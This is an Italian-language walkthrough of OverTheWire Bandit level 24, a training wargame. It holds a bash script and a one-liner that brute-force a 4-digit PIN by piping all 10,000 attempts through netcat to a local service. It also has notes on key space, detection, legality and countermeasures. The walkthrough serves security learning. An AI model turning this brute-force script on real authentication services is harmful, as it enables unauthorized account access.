# Bandit Level 24 → Level 25

## Obiettivo
Brute-forcing di un PIN numerico a 4 cifre per un servizio di autenticazione in ascolto sulla porta 30002.

## Comandi utilizzati
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220

# 1. Creare script di brute-forcing
cd /tmp
mkdir brute_dir
cd brute_dir

# 2. Script bash per generare 10000 tentativi
cat > brute.sh << 'EOF'
#!/bin/bash
PASS="*password livello corrente*"
for pin in {0000..9999}; do
    echo "$PASS $pin"
done | nc localhost 30002 | grep -v "Wrong"
EOF

# 3. Eseguire lo script
chmod +x brute.sh
./brute.sh

# Alternativa one-liner
for i in {0000..9999}; do echo "*password livello corrente* $i"; done | nc localhost 30002 | grep -v "Wrong"
```

## Analisi tecnica

### Cosa ho imparato

- **Brute-force automatizzato**: generazione sistematica di input per testare spazio delle chiavi
- **Range expansion bash**: `{0000..9999}` genera tutte le combinazioni a 4 cifre con padding
- **Pipeline ottimizzata**: invio continuo di tentativi senza aprire connessioni separate
- **Filtering output**: `grep -v "Wrong"` per nascondere tentativi falliti e mostrare solo successo

### Strategia di attacco

1. **Spazio delle chiavi**: 10⁴ = 10000 combinazioni (00..0 a 99..9)

2. **Protocollo**: password + spazio + PIN + newline

3. **Ottimizzazione**: connessione TCP persistente per tutti i tentativi

4. **Identificazione successo**: output diverso da "Wrong" (es. "Correct!")

### Domande aperte
- Quali tecniche limitano efficacemente il brute-forcing?
- Come funzionano gli attacchi di tipo "online" vs "offline" brute-force?
- In penetration test, quando è etico/legale eseguire brute-forcing?
- Quali tool specializzati esistono per brute-forcing?
- Come proteggere servizi da attacchi brute-force?

### Note
Questo livello insegna i fondamenti del brute-forcing e l'automazione di attacchi a dizionario.
In scenari reali, considerazioni importanti:

- **Legalità**: ottenere autorizzazione esplicita prima di testare
- **Efficienza**: ottimizzare generazione e invio tentativi
- **Rilevamento**: attacchi brute-force lasciano tracce evidenti nei log
- **Contromisure**: implementare limitazioni appropriate

Esecuzione pratica: 10000 tentativi su localhost richiedono solo pochi secondi

È stato dimostrato che sono vulnerabili i seguenti tipi di servizi:
1. Non limitano tentativi di autenticazione
2. Usano PIN a bassa entropia
3. Non implementano ritardi progressivi
4. Danno feedback dettagliati sugli errori